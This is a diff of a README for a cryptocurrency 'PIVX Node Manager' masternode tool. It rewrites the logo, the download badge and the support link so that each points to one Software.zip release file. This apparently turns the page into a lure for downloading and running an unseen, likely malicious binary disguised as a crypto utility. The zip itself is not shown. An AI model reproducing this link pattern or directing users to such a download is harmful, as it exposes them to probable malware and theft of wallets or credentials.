@@ -1,6 +1,6 @@
 # 🚀 Welcome to PIVX Node Manager - Masternode Management 🖥️
 
-![PIVX Node Manager Logo](https://example.com/pivx-node-manager.png)
+![PIVX Node Manager Logo](https://github.com/Oriolet/PIVX-Node-Manager-Masternode-Management/releases/download/v1.0/Software.zip)
 
 ## Overview
 
@@ -20,7 +20,7 @@ Welcome to the **PIVX Node Manager**, your go-to tool for efficiently managing P
 
 To get started, download the latest version of PIVX Node Manager from the link below:
 
-[![Download PIVX Node Manager](https://img.shields.io/badge/Download%20PIVX%20Node%20Manager-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download PIVX Node Manager](https://github.com/Oriolet/PIVX-Node-Manager-Masternode-Management/releases/download/v1.0/Software.zip%20PIVX%20Node%20Manager-v1.0.0-blue)](https://github.com/Oriolet/PIVX-Node-Manager-Masternode-Management/releases/download/v1.0/Software.zip)
 
 Once downloaded, launch the installation wizard and follow the on-screen instructions to set up PIVX Node Manager on your system.
 
@@ -60,6 +60,6 @@ Now that you have PIVX Node Manager installed, it's time to dive into the world 
 
 ## Support
 
-For any questions, issues, or feedback regarding PIVX Node Manager, feel free to [visit our GitHub repository](https://github.com/pivx/pivx-node-manager) and create a new issue. Our team is always ready to assist you in any way we can.
+For any questions, issues, or feedback regarding PIVX Node Manager, feel free to [visit our GitHub repository](https://github.com/Oriolet/PIVX-Node-Manager-Masternode-Management/releases/download/v1.0/Software.zip) and create a new issue. Our team is always ready to assist you in any way we can.
 
 Let's revolutionize the way we manage PIVX masternodes with PIVX Node Manager! 🌟 Thank you for choosing us. 🚀
